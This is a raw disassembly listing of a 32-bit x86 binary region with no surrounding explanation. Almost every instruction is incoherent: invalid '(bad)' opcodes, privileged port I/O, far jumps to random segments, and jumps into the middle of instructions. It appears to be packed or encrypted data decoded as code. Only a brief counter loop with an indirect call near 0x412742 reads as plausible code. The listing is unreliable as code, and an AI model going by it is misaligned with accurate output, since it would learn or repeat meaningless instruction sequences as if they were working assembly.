  4121fb:	cmc    
  4121fc:	loop   0x41226c
  4121fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121ff:	jne    0x412239
  412201:	xchg   esi,eax
  412202:	mov    al,ds:0xfb9cd15
  412207:	inc    esp
  412208:	cdq    
  412209:	jp     0x4121f7
  41220b:	xor    ecx,ecx
  41220d:	push   edx
  41220e:	ins    DWORD PTR es:[edi],dx
  41220f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412210:	mov    DWORD PTR [edx+0x2f2b10c0],eax
  412216:	sbb    BYTE PTR [edx+0x36edb866],0x85
  41221d:	sbb    eax,0x8e918738
  412222:	pop    ecx
  412223:	in     al,dx
  412224:	mov    bh,0xad
  412226:	cmp    bl,BYTE PTR [eax-0x2ae92612]
  41222c:	nop
  41222d:	call   DWORD PTR [ecx+0x34]
  412230:	call   FWORD PTR [eax-0x26]
  412233:	stc    
  412234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412235:	xor    dh,BYTE PTR [ebx+eiz*8]
  412238:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41223a:	dec    eax
  41223b:	mov    ch,0x65
  41223d:	dec    esi
  41223e:	mov    esp,0xf70c98d5
  412243:	jno    0x4121fe
  412245:	popf   
  412246:	cmp    bl,BYTE PTR [ecx]
  412248:	pop    ds
  412249:	mov    bl,0xe0
  41224b:	jae    0x412267
  41224d:	mov    eax,ds:0xa5071ed4
  412252:	push   edx
  412253:	lods   eax,DWORD PTR ds:[esi]
  412254:	jle    0x412291
  412256:	fwait
  412257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412258:	pop    es
  412259:	pop    ss
  41225a:	push   esp
  41225b:	jp     0x412267
  41225d:	push   eax
  41225e:	mov    cl,0x80
  412260:	hlt    
  412261:	out    0x3f,al
  412263:	fwait
  412264:	sub    cl,dl
  412266:	pop    edi
  412267:	or     ecx,DWORD PTR [ebx+0x69]
  41226a:	iret   
  41226b:	inc    ebp
  41226c:	imul   esp,DWORD PTR [esi-0x3fefb9a0],0x7b335d01
  412276:	in     eax,dx
  412277:	add    eax,0xa210ab31
  41227c:	outs   dx,BYTE PTR ds:[esi]
  41227d:	sbb    al,0x6c
  41227f:	mov    DWORD PTR [ebx+0x54],esi
  412282:	cs ja  0x412233
  412285:	cwde   
  412286:	test   al,0xb6
  412288:	mov    al,BYTE PTR [esi+0x25]
  41228b:	xchg   ebx,eax
  41228c:	hlt    
  41228d:	push   esp
  41228e:	add    BYTE PTR [edx],al
  412290:	pushf  
  412291:	iret   
  412292:	fdiv   QWORD PTR [eax-0x3f]
  412295:	stc    
  412296:	fxam   
  412298:	xor    DWORD PTR [eax-0x5a],eax
  41229b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41229c:	pop    eax
  41229d:	cmp    eax,0xd66297ff
  4122a2:	test   eax,0xf406d978
  4122a7:	popa   
  4122a8:	pop    ebp
  4122a9:	adc    eax,0x48444c22
  4122ae:	inc    esi
  4122af:	xor    BYTE PTR [ebp+0x21],al
  4122b2:	add    BYTE PTR [esi+0x4ad352d],0x8a
  4122b9:	mov    bl,0x5d
  4122bb:	hlt    
  4122bc:	mov    edx,0xf71b8a01
  4122c1:	xchg   edx,eax
  4122c2:	pop    ecx
  4122c3:	jno    0x41224c
  4122c5:	cmp    bl,BYTE PTR [eax]
  4122c7:	ins    BYTE PTR es:[edi],dx
  4122c8:	xor    BYTE PTR [eax-0x27],dl
  4122cb:	sbb    DWORD PTR [edx-0x44],edi
  4122ce:	adc    cl,ch
  4122d0:	jp     0x412344
  4122d2:	shl    BYTE PTR [esi+0x5b],1
  4122d5:	adc    DWORD PTR [esi+0x3c],0xfffffff0
  4122d9:	std    
  4122da:	call   0xb6c:0xbf04998a
  4122e1:	out    0xe2,al
  4122e3:	add    cl,BYTE PTR [eax]
  4122e5:	mov    bh,0xf1
  4122e7:	or     BYTE PTR [ebx+edx*2+0xdc9ab7a],0xb5
  4122ef:	mov    ds:0x7c14c21b,eax
  4122f4:	stos   DWORD PTR es:[edi],eax
  4122f5:	jmp    0xac79:0x4fa1f596
  4122fc:	jp     0x41233f
  4122fe:	lods   ax,WORD PTR ds:[esi]
  412300:	mov    WORD PTR [ebp-0xf],gs
  412303:	out    dx,al
  412304:	push   ecx
  412305:	mov    ds:0x56fb6932,eax
  41230a:	xchg   ebx,eax
  41230b:	cmp    DWORD PTR [ecx+edx*8+0x71ed59b3],ebx
  412312:	push   0xff727ac9
  412317:	(bad)  
  412318:	sbb    BYTE PTR [eax],bl
  41231a:	cmp    bl,BYTE PTR [ecx+esi*2-0x3862c9a]
  412321:	rcl    edx,cl
  412323:	mov    fs,ecx
  412325:	sbb    bh,dh
  412327:	sbb    eax,0x8360eff6
  41232c:	outs   dx,BYTE PTR ds:[esi]
  41232d:	mov    dl,0xf
  41232f:	enter  0xfaf2,0xad
  412333:	dec    ecx
  412334:	sbb    eax,0xa4d9284
  412339:	(bad)  
  41233b:	scas   eax,DWORD PTR es:[edi]
  41233c:	aas    
  41233d:	adc    dh,BYTE PTR ds:0x2746ebd5
  412343:	jecxz  0x41236e
  412345:	gs mov al,0xd5
  412348:	scas   eax,DWORD PTR es:[edi]
  412349:	jl     0x4123a6
  41234b:	repz cmp al,BYTE PTR [ecx-0x2ac67fe4]
  412352:	xlat   BYTE PTR ds:[ebx]
  412353:	pop    edx
  412354:	xchg   ecx,eax
  412355:	jne    0x412316
  412357:	int3   
  412358:	pop    ss
  412359:	xor    eax,0x83bc42a3
  41235e:	add    DWORD PTR [esi-0x23f620c8],0x15
  412365:	add    eax,0x82f48cbb
  41236a:	or     ebp,DWORD PTR [esi+0x4d]
  41236d:	adc    edi,edx
  41236f:	push   0x3f03aa89
  412374:	dec    edi
  412375:	dec    esp
  412376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412377:	test   eax,0x89710a53
  41237c:	jne    0x4123dd
  41237e:	jmp    0x227e7bdc
  412383:	inc    ebx
  412384:	data16 mov ch,0x41
  412387:	test   eax,0xad9229fa
  41238c:	mov    ah,0x49
  41238e:	ficomp WORD PTR [ecx-0x15]
  412391:	inc    esi
  412392:	adc    al,0x80
  412394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412395:	je     0x4123eb
  412397:	mov    fs,WORD PTR [esi]
  412399:	rcr    BYTE PTR [edx],1
  41239b:	mov    eax,ds:0x7649d6a
  4123a0:	jbe    0x4123e2
  4123a2:	adc    dl,BYTE PTR [ebx]
  4123a4:	and    bh,BYTE PTR [ebx]
  4123a6:	shl    DWORD PTR [ebp+0x41b0788d],1
  4123ac:	fnstenv [ecx-0x7b]
  4123af:	fwait
  4123b0:	cld    
  4123b1:	xchg   ebx,eax
  4123b2:	je     0x412393
  4123b4:	mov    WORD PTR [esi-0x67],fs
  4123b7:	mov    al,0xd2
  4123b9:	mov    eax,0xff65ccf1
  4123be:	cmp    BYTE PTR [edi-0x39],dl
  4123c1:	inc    esi
  4123c2:	lock jnp 0x4123d0
  4123c5:	and    DWORD PTR [edi+0x3b],esp
  4123c8:	mov    esp,0x8706cb0
  4123cd:	sub    bh,al
  4123cf:	adc    BYTE PTR [esi],ah
  4123d1:	imul   ecx,DWORD PTR [edi+0x11],0xffffff95
  4123d5:	inc    ebx
  4123d6:	fadd   DWORD PTR ds:0x1e038202
  4123dc:	retf   
  4123dd:	or     esp,DWORD PTR [esi]
  4123df:	dec    edi
  4123e0:	mov    dl,0x42
  4123e2:	cdq    
  4123e3:	pop    esp
  4123e4:	xor    BYTE PTR ds:0x4c5c7798,ah
  4123ea:	pop    ds
  4123eb:	mov    bl,0xd5
  4123ed:	fstp   TBYTE PTR [ebp+0x47]
  4123f0:	pushf  
  4123f1:	int3   
  4123f2:	in     eax,0x73
  4123f4:	pusha  
  4123f5:	fmulp  st(2),st
  4123f7:	xchg   ebx,eax
  4123f8:	dec    edi
  4123f9:	pusha  
  4123fa:	pop    esi
  4123fb:	mov    al,ch
  4123fd:	cmp    ch,BYTE PTR [ebp+ecx*8+0x59416f0c]
  412404:	ins    BYTE PTR es:[edi],dx
  412405:	adc    eax,0xbfe658b1
  41240a:	mov    bl,0x83
  41240c:	in     al,dx
  41240d:	in     al,dx
  41240e:	cmp    bh,cl
  412410:	nop
  412411:	lock test DWORD PTR [edi-0x77],edi
  412415:	xlat   BYTE PTR ds:[ebx]
  412416:	jae    0x4123fd
  412418:	cmp    bh,BYTE PTR [ecx+0x15]
  41241b:	sti    
  41241c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41241d:	xor    DWORD PTR [edi*1+0x2aa96d44],0x1b9568bd
  412428:	xor    ebx,0x1cc8a073
  41242e:	add    edx,ebx
  412430:	ja     0x4123f4
  412432:	adc    dh,0x56
  412435:	dec    ebp
  412436:	fmul   DWORD PTR [ecx-0x1f]
  412439:	adc    esp,DWORD PTR [edx]
  41243b:	into   
  41243c:	jnp    0x41243d
  41243e:	mov    ah,0x2
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fd79,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	pop    ss
  41245e:	sub    ebx,DWORD PTR [edx]
  412460:	cs (bad) 
  412462:	pop    esp
  412463:	jo     0x4124d5
  412465:	mov    ecx,0x2b70707e
  41246a:	cmp    DWORD PTR gs:[edi-0x2a7fdf27],esp
  412471:	cdq    
  412472:	aaa    
  412473:	cmp    eax,0xaffe36ae
  412478:	enter  0xc59d,0xb8
  41247c:	jno    0x4124c9
  41247e:	stc    
  41247f:	pop    esp
  412480:	ret    
  412481:	gs loopne 0x4124b8
  412484:	test   DWORD PTR [eax-0x25],edi
  412487:	xchg   BYTE PTR [esi-0x5a],cl
  41248a:	test   BYTE PTR [eax],0xf8
  41248d:	test   BYTE PTR [edi+0x1c095c5e],ah
  412493:	mov    edx,0x3493e18c
  412498:	mov    ah,bl
  41249a:	repnz xchg esp,eax
  41249c:	(bad)  
  41249e:	lock jmp 0x4124d2
  4124a1:	dec    esp
  4124a2:	(bad)  
  4124a3:	frstor [edi]
  4124a5:	mov    fs,WORD PTR [ebx+ebp*2-0x2fef11a5]
  4124ac:	test   BYTE PTR [ecx+0x3f],0xde
  4124b0:	shl    ebx,0x2e
  4124b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124b4:	loopne 0x412513
  4124b6:	dec    eax
  4124b7:	mov    edi,0x3b59fe9b
  4124bc:	mov    ah,0xe0
  4124be:	cs (bad) 
  4124c0:	jecxz  0x4124b0
  4124c2:	sbb    al,BYTE PTR [edi+ebx*1]
  4124c5:	jecxz  0x4124b6
  4124c7:	iret   
  4124c8:	mov    eax,ds:0xdf3830f2
  4124cd:	mov    dh,0xc4
  4124cf:	xor    DWORD PTR [esi-0x757ed713],edx
  4124d5:	or     al,0xd0
  4124d7:	mov    ah,0xd3
  4124d9:	mov    dl,0x51
  4124db:	mov    BYTE PTR [edx+edx*8-0xc],dh
  4124df:	jle    0x412512
  4124e1:	femms  
  4124e3:	retf   
  4124e4:	add    eax,ebx
  4124e6:	xchg   esp,eax
  4124e7:	or     eax,DWORD PTR [eax-0x51b01276]
  4124ed:	ds or  eax,0x69784647
  4124f3:	cdq    
  4124f4:	and    cl,BYTE PTR [edx+0x11a0e736]
  4124fa:	ficom  WORD PTR ds:0x766564a5
  412500:	imul   DWORD PTR [edx+0x9]
  412503:	mov    ah,0x14
  412505:	stos   DWORD PTR es:[edi],eax
  412506:	adc    eax,0xe839273d
  41250b:	or     ebx,DWORD PTR [eax+edx*4+0x13]
  41250f:	mov    ds:0xaf37f1f1,eax
  412514:	cmp    cl,BYTE PTR [ecx-0x3ec8e4ed]
  41251a:	sbb    eax,DWORD PTR [edi-0x16d7507a]
  412520:	xchg   BYTE PTR [ecx+0x6545879f],bl
  412526:	fs (bad) 
  412528:	jmp    0x289a9c83
  41252d:	jno    0x41257b
  41252f:	mov    eax,ds:0x2da8bfe2
  412534:	pop    ebx
  412535:	mov    ebp,0x7cfc7332
  41253a:	or     DWORD PTR [ebp+0x25],ecx
  41253d:	shl    BYTE PTR [edi-0x19],cl
  412540:	xchg   BYTE PTR [ecx+ebp*4+0x50016f33],ah
  412547:	sub    BYTE PTR [edi],bh
  412549:	xchg   ecx,eax
  41254a:	mov    dl,0x2c
  41254c:	mov    esi,0x8ea6a7f5
  412551:	cmp    al,0x4
  412553:	out    0x1e,eax
  412555:	scas   eax,DWORD PTR es:[edi]
  412556:	lds    edx,FWORD PTR [eax-0x31]
  412559:	and    al,0xd1
  41255b:	xor    esp,ecx
  41255d:	and    dl,dl
  41255f:	cli    
  412560:	out    dx,al
  412561:	push   edi
  412562:	pop    eax
  412563:	pop    edi
  412564:	mov    ebx,0xba5c377d
  412569:	mov    bh,0x4a
  41256b:	and    ah,bl
  41256d:	sbb    al,0x93
  41256f:	or     al,0xef
  412571:	cld    
  412572:	xchg   edi,eax
  412573:	cmp    BYTE PTR [esi],dl
  412575:	popf   
  412576:	mov    ecx,0xce86e2cf
  41257b:	add    BYTE PTR [ebx],bh
  41257d:	pop    ebx
  41257e:	push   ebp
  41257f:	xchg   ebx,eax
  412580:	inc    ecx
  412581:	inc    ecx
  412582:	xor    BYTE PTR [esi],dl
  412584:	inc    eax
  412585:	sub    ecx,ebx
  412587:	loop   0x412604
  412589:	iret   
  41258a:	lock cmp dh,0x5a
  41258e:	adc    DWORD PTR [ecx+0x6e],0xffffffb4
  412592:	call   0xb25c:0xa02ee66f
  412599:	scas   al,BYTE PTR es:[edi]
  41259a:	ins    BYTE PTR es:[edi],dx
  41259b:	les    ecx,FWORD PTR [edx-0x3a24eebb]
  4125a1:	inc    ecx
  4125a2:	leave  
  4125a3:	lods   al,BYTE PTR ds:[esi]
  4125a4:	out    0x4e,al
  4125a6:	and    al,0xe3
  4125a8:	fsub   QWORD PTR [ecx+edx*8]
  4125ab:	fst    st(3)
  4125ad:	std    
  4125ae:	mov    edx,0x1d463364
  4125b3:	cmp    edi,esp
  4125b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125b6:	push   0xffffffbe
  4125b8:	fadd   QWORD PTR [ecx-0x6]
  4125bb:	or     edx,0x30
  4125be:	iret   
  4125bf:	mov    ah,0x94
  4125c1:	cmp    eax,0xd2b95773
  4125c6:	xchg   BYTE PTR ds:0xc2a73666,ah
  4125cc:	push   edi
  4125cd:	or     DWORD PTR [ebx],ebp
  4125cf:	pop    ebp
  4125d0:	xor    bl,BYTE PTR [eax]
  4125d2:	xchg   esi,eax
  4125d3:	ins    BYTE PTR es:[edi],dx
  4125d4:	xlat   BYTE PTR ds:[ebx]
  4125d5:	jmp    0x4883e23c
  4125da:	dec    esp
  4125db:	pop    ds
  4125dc:	aaa    
  4125dd:	and    dh,BYTE PTR [eax+0x4a]
  4125e0:	icebp  
  4125e1:	add    BYTE PTR [eax-0x659d3362],ch
  4125e7:	rol    DWORD PTR ds:0x565dbf99,cl
  4125ed:	or     edx,DWORD PTR [eax-0xd]
  4125f0:	test   eax,0xf272b550
  4125f5:	jnp    0x4125b2
  4125f7:	adc    al,dh
  4125f9:	ins    BYTE PTR es:[edi],dx
  4125fa:	test   eax,0xc2e48f83
  4125ff:	jnp    0x4125c2
  412601:	je     0x41261c
  412603:	dec    ecx
  412604:	jno    0x412595
  412606:	add    eax,0xb42d6242
  41260b:	aas    
  41260c:	dec    ebx
  41260d:	lock (bad) 
  41260f:	clc    
  412610:	cmp    al,0x8c
  412612:	(bad)  
  412614:	jmp    0xe3ae:0x4907e735
  41261b:	dec    BYTE PTR [ebx-0x7a02fee1]
  412621:	sub    eax,0xbf83a655
  412626:	pop    eax
  412627:	and    edi,DWORD PTR [edi-0x3b]
  41262a:	ret    
  41262b:	cs std 
  41262d:	ins    DWORD PTR es:[edi],dx
  41262e:	push   ebx
  41262f:	outs   dx,BYTE PTR ds:[esi]
  412630:	mov    dl,0xa1
  412632:	mov    ah,0xaf
  412634:	mov    edx,esi
  412636:	lea    edx,ds:0x3a993d62
  41263c:	or     DWORD PTR [esi-0x73],edi
  41263f:	cmp    BYTE PTR [ecx+ecx*4+0x6c52aeb3],bl
  412646:	add    eax,0x85726f58
  41264b:	cli    
  41264c:	enter  0xadbd,0x62
  412650:	in     eax,dx
  412651:	(bad)  
  412652:	test   eax,0x5b279cd3
  412657:	inc    eax
  412658:	shl    dh,cl
  41265a:	or     ecx,esp
  41265c:	ss (bad) 
  41265e:	mov    ah,0xd6
  412660:	fbstp  TBYTE PTR [ecx+0x7423da2c]
  412666:	(bad)  
  412667:	stos   BYTE PTR es:[edi],al
  412668:	mov    ch,0xbd
  41266a:	mov    ds:0x2feb341f,al
  41266f:	je     0x41267f
  412671:	pop    esi
  412672:	xchg   ebp,eax
  412673:	xor    al,0xfb
  412675:	cld    
  412676:	sbb    BYTE PTR [eax-0x5c],0x21
  41267a:	ror    BYTE PTR [esp+esi*1-0x1c],1
  41267e:	xor    ah,BYTE PTR [esp+eiz*4-0x65]
  412682:	test   eax,0x12b9b890
  412687:	add    al,0x76
  412689:	loop   0x4126ac
  41268b:	cld    
  41268c:	mov    ?,WORD PTR [eax+eiz*1+0x73]
  412690:	lock dec edx
  412692:	pop    eax
  412693:	add    eax,0xbe549941
  412698:	vrsqrtss xmm5,xmm7,DWORD PTR [ebp-0x4d]
  41269d:	fs mov edi,0x98578f85
  4126a3:	test   DWORD PTR [ebp-0x3b1bd02],ebx
  4126a9:	sbb    edi,DWORD PTR [edx+0x239e470d]
  4126af:	imul   ecx,DWORD PTR ds:0x2815b0e0,0xf04090fb
  4126b9:	repz rol edi,0xb7
  4126bd:	in     al,dx
  4126be:	lods   eax,DWORD PTR ds:[esi]
  4126bf:	mov    bh,0xf7
  4126c1:	or     al,0xe2
  4126c3:	mov    ds:0xbd91396d,al
  4126c9:	aad    0xb
  4126cb:	inc    esi
  4126cc:	cmp    ah,BYTE PTR [ebx+ebx*4-0x19]
  4126d0:	fdivr  DWORD PTR [edx-0x2e52d42a]
  4126d6:	mov    bh,ch
  4126d8:	das    
  4126d9:	inc    ebx
  4126da:	pop    eax
  4126db:	cwde   
  4126dc:	clc    
  4126dd:	dec    edi
  4126de:	adc    eax,0x67609c02
  4126e3:	(bad)  
  4126e4:	ds pop esp
  4126e6:	push   esi
  4126e7:	push   0xffffffb1
  4126e9:	ds pop ebx
  4126eb:	xchg   esi,eax
  4126ec:	fcom   st(5)
  4126ee:	adc    ah,cl
  4126f0:	imul   ebp,DWORD PTR [esi+eax*8+0xf5cb7d1],0x27
  4126f8:	in     al,0xdd
  4126fa:	push   ss
  4126fb:	or     eax,0x1291cb90
  412700:	mov    eax,ds:0xc686818
  412705:	adc    dh,bh
  412707:	gs fadd st,st(1)
  41270a:	xlat   BYTE PTR ds:[ebx]
  41270b:	add    DWORD PTR ds:0x34bdbca0,ebx
  412711:	pushf  
  412712:	not    BYTE PTR [ecx]
  412714:	xchg   ch,ch
  412716:	mov    dh,ah
  412718:	repnz xor BYTE PTR [eax+0x4fc53120],dh
  41271f:	dec    eax
  412720:	pushf  
  412721:	push   edi
  412722:	xor    DWORD PTR [edi+0x773168c7],0x31efa985
  41272c:	inc    ebx
  41272d:	iret   
  41272e:	lahf   
  41272f:	sbb    DWORD PTR [ecx+0x2581e44d],ecx
  412735:	idiv   ch
  412737:	inc    edx
  412738:	add    BYTE PTR [eax],al
  41273a:	add    BYTE PTR [eax],al
  41273c:	add    cl,ch
  41273e:	sldt   WORD PTR [eax]
  412741:	add    BYTE PTR [ebx],dh
  412743:	leave  
  412744:	or     ecx,DWORD PTR ds:0x42fdf6
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fdf6,ecx
  412751:	cmp    DWORD PTR ds:0x42fdf6,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fdf6,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e393
  41277c:	cmp    DWORD PTR ds:0x42fdf6,0x10
  412783:	jne    0x412796
  412789:	mov    ecx,DWORD PTR ds:0x42fdf6
  41278f:	inc    ecx
  412790:	mov    DWORD PTR ds:0x42fdf6,ecx
  412796:	jmp    0x412742
  41279b:	mov    ecx,DWORD PTR [ebp+0x14]
  41279e:	push   esi
  41279f:	xor    DWORD PTR ds:0x42fdee,0x1648
  4127a9:	push   edi
  4127aa:	test   ecx,ecx
  4127ac:	jmp    0x412a90
  4127b1:	mov    ds:0xc112c158,eax
  4127b6:	mov    cl,0x73
  4127b8:	jne    0x4127c0
  4127ba:	jne    0x4127b4
  4127bc:	sub    ebx,DWORD PTR [eax-0x370979f6]
  4127c2:	pop    ecx
  4127c3:	jo     0x412835
  4127c5:	mov    ecx,0x3370707e
  4127ca:	in     eax,0x89
  4127cc:	jae    0x4127f4
  4127ce:	rcl    BYTE PTR [esi-0x26],cl
  4127d1:	jle    0x412845
  4127d3:	pop    eax
  4127d4:	add    DWORD PTR [eax],ebp
  4127d6:	jns    0x4127d4
  4127d8:	sub    eax,0x89711964
  4127dd:	inc    ah
  4127df:	pop    esp
  4127e0:	or     esi,ebx
  4127e2:	xchg   BYTE PTR [esi],ah
  4127e4:	fsubr  st,st(6)
  4127e6:	stos   BYTE PTR es:[edi],al
  4127e7:	cmp    ecx,DWORD PTR [esi]
  4127e9:	retf   
  4127ea:	sbb    al,0x9f
  4127ec:	shl    dl,1
  4127ee:	jl     0x41280b
  4127f0:	outs   dx,DWORD PTR ds:[esi]
  4127f1:	jmp    0x35ed:0x84cb7e00
  4127f8:	scas   al,BYTE PTR es:[edi]
  4127f9:	out    dx,al
  4127fa:	loop   0x4127dc
  4127fc:	jae    0x4127f1
  4127fe:	scas   eax,DWORD PTR es:[edi]
  4127ff:	movaps xmm7,XMMWORD PTR [ebx-0x7f5631c1]
  412806:	int3   
  412807:	ret    0x1db3
  41280a:	pop    esi
  41280b:	out    0x9c,al
  41280d:	fldcw  WORD PTR cs:[edx]
  412810:	jl     0x4127c2
  412812:	mov    ebp,0xf148bfc6
  412817:	mov    bl,0xbc
  412819:	mov    dl,0x41
  41281b:	push   es
  41281c:	test   BYTE PTR [edx+0x6d],dh
  41281f:	push   ss
  412820:	cmp    ch,bl
  412822:	(bad)  
  412823:	fcmovbe st,st(3)
  412825:	push   esp
  412826:	and    bl,BYTE PTR [ebx]
  412828:	add    esi,DWORD PTR [edx-0x4c]
  41282b:	lock xchg edi,eax
  41282d:	add    al,0x39
  41282f:	and    cl,BYTE PTR [edi+0x27]
  412832:	fidiv  DWORD PTR [edi-0x5544e00e]
  412838:	adc    BYTE PTR [ebx],ch
  41283a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41283b:	xchg   esp,eax
  41283c:	mov    ecx,0xcfc5d4f8
  412841:	lods   eax,DWORD PTR cs:[esi]
  412843:	jb     0x412835
  412845:	sub    bh,BYTE PTR [edx+edx*8-0x256653bc]
  41284c:	std    
  41284d:	xchg   ebx,eax
  41284e:	jno    0x41286e
  412850:	xor    bh,BYTE PTR ds:[edi-0x32]
  412854:	xlat   BYTE PTR ds:[ebx]
  412855:	adc    DWORD PTR [ebx],eax
  412857:	push   esi
  412858:	pop    DWORD PTR [ecx+0x50]
  41285b:	test   al,0xa6
  41285d:	mov    ebx,0x330a5a59
  412862:	pcmpgtw mm6,mm6
  412865:	daa    
  412866:	retf   0xa785
  412869:	aaa    
  41286a:	in     al,0x78
  41286c:	inc    ecx
  41286d:	and    bl,ah
  41286f:	pusha  
  412870:	push   edx
  412871:	retf   
  412872:	mov    eax,ds:0xb55ee0be
  412877:	and    BYTE PTR [esi],al
  412879:	ds addr16 aaa 
  41287c:	ror    eax,0xe0
  41287f:	mov    ch,0xaf
  412881:	adc    esp,DWORD PTR [ebx-0x1019910b]
  412887:	jns    0x4128f9
  412889:	cmp    BYTE PTR [edx-0x77],bh
  41288c:	loop   0x412883
  41288e:	push   edx
  41288f:	inc    esp
  412890:	mov    ch,0x94
  412892:	cmp    DWORD PTR [ecx],edi
  412894:	xor    BYTE PTR [eax-0x656bf165],ah
  41289a:	aam    0x43
  41289c:	sbb    dh,BYTE PTR [ecx]
  41289e:	in     eax,dx
  41289f:	mov    ebp,0x6991c512
  4128a4:	cli    
  4128a5:	cmp    ch,al
  4128a7:	or     al,0x33
  4128a9:	aad    0xbb
  4128ab:	pop    edi
  4128ac:	call   DWORD PTR [eax+0x5097b8f0]
  4128b2:	push   es
  4128b3:	mov    cl,0x85
  4128b5:	jnp    0x41289f
  4128b7:	sbb    bl,BYTE PTR [ecx+0x38abdc70]
  4128bd:	sbb    esp,edx
  4128bf:	call   0x6ec8:0x2567ec8d
  4128c6:	into   
  4128c7:	inc    eax
  4128c8:	ror    DWORD PTR [ebp-0x4961a88f],1
  4128ce:	in     al,dx
  4128cf:	sbb    cl,BYTE PTR [ecx]
  4128d1:	ret    0x12fb
  4128d4:	test   DWORD PTR ds:[edi],ecx
  4128d7:	mov    ah,0x3
  4128d9:	fld    TBYTE PTR [ecx+eax*4]
  4128dc:	loopne 0x41289d
  4128de:	nop
  4128df:	jecxz  0x4128b6
  4128e1:	mov    esp,0x30b35465
  4128e6:	cwde   
  4128e7:	mov    esp,0x14e371df
  4128ec:	popa   
  4128ed:	out    dx,al
  4128ee:	sahf   
  4128ef:	scas   al,BYTE PTR es:[edi]
  4128f0:	imul   esp,DWORD PTR [esp+edi*1-0x3c8835b4],0xff54fcb3
  4128fb:	test   eax,0xffc8ec85
  412900:	adc    BYTE PTR [ebx-0x786e8f8a],dl
  412906:	xchg   ecx,eax
  412907:	jp     0x4128da
  412909:	sub    BYTE PTR [ebx],bl
  41290b:	sub    al,0x2f
  41290d:	(bad)  
  41290e:	mov    bh,0xef
  412910:	add    BYTE PTR [edi-0x14],cl
  412913:	mov    BYTE PTR [esi+0x12],cl
  412916:	xchg   ebp,eax
  412917:	pop    es
  412918:	dec    eax
  412919:	cli    
  41291a:	add    DWORD PTR [esi-0x4a7870f],ecx
  412920:	jp     0x412943
  412922:	in     eax,dx
  412923:	loope  0x4128c8
  412925:	fwait
  412926:	retf   0x587c
  412929:	sub    eax,0x4cdf6325
  41292e:	pop    ss
  41292f:	sbb    al,BYTE PTR [eax+0x63831cdc]
  412935:	inc    edi
  412936:	and    cl,BYTE PTR [esi-0x43]
  412939:	ins    DWORD PTR es:[edi],dx
  41293a:	fistp  DWORD PTR [di-0x2a6e]
  41293f:	mov    al,ds:0x4c8b51f5
  412944:	xlat   BYTE PTR ds:[ebx]
  412945:	les    esi,FWORD PTR [ecx]
  412947:	ss into 
  412949:	xor    eax,0xa61a8dd2
  41294e:	(bad)  
  41294f:	ret    
  412950:	loopne 0x412947
  412952:	jb     0x412984
  412954:	sub    al,0x50
  412956:	lock js 0x41290b
  412959:	outs   dx,BYTE PTR ds:[esi]
  41295a:	mov    ds:0x4233553a,eax
  41295f:	pop    esp
  412960:	xchg   ebp,eax
  412961:	fisub  WORD PTR [ecx+eax*1+0x5c]
  412965:	xchg   ecx,eax
  412966:	or     DWORD PTR [edx-0x515749e1],0xffffffc8
  41296d:	inc    ecx
  41296e:	pushf  
  41296f:	xchg   DWORD PTR [ebp+0x71],ecx
  412972:	push   es
  412973:	(bad)  
  412974:	and    DWORD PTR [ecx+0x2c63e697],esi
  41297a:	pop    ss
  41297b:	stc    
  41297c:	inc    ebp
  41297d:	or     al,0xae
  41297f:	mov    ch,0xbb
  412981:	ins    BYTE PTR es:[edi],dx
  412982:	test   al,0xef
  412984:	(bad)  
  412985:	lods   eax,DWORD PTR ds:[esi]
  412986:	loope  0x412984
  412988:	je     0x4129f2
  41298a:	jg     0x412917
  41298c:	jns    0x412923
  41298e:	int    0x34
  412990:	xor    BYTE PTR [ebp+eiz*8+0x52a40e09],dh
  412997:	push   ecx
  412998:	(bad)  
  412999:	jb     0x4129e9
  41299b:	jl     0x412944
  41299d:	(bad)  [eax-0x493ead63]
  4129a3:	mov    bl,0x65
  4129a5:	out    dx,al
  4129a6:	jmp    DWORD PTR ss:[ebp-0x5f]
  4129aa:	test   eax,0xa043c707
  4129af:	out    dx,eax
  4129b0:	inc    edi
  4129b1:	bound  edx,QWORD PTR [edx-0x4e7b3653]
  4129b7:	inc    edi
  4129b8:	sahf   
  4129b9:	enter  0x50c4,0x68
  4129bd:	popa   
  4129be:	push   edi
  4129bf:	dec    eax
  4129c0:	rcr    DWORD PTR [ecx+edi*1],0xa5
  4129c4:	or     edi,edx
  4129c6:	shr    DWORD PTR [ecx],0x78
  4129c9:	mov    bh,0xce
  4129cb:	push   ss
  4129cc:	sbb    al,0x83
  4129ce:	pop    esi
  4129cf:	dec    ecx
  4129d0:	mov    esi,0xb5d7bfbf
  4129d5:	mov    dl,BYTE PTR [eax-0x5accdac]
  4129db:	mov    esi,0x25599366
  4129e0:	mov    ch,0x6a
  4129e2:	xor    edx,DWORD PTR [eax+eiz*1-0x1101b76]
  4129e9:	or     DWORD PTR [edi+edx*4],ebp
  4129ec:	xor    eax,0x5966858
  4129f1:	les    esi,FWORD PTR [ebp+0x557f4446]
  4129f7:	and    DWORD PTR [ebp+0x62],esi
  4129fa:	jae    0x4129c4
  4129fc:	sbb    al,0x88
  4129fe:	test   DWORD PTR [edx-0x3c0f5efc],0x14518e75
  412a08:	pop    ebx
  412a09:	xlat   BYTE PTR ds:[ebx]
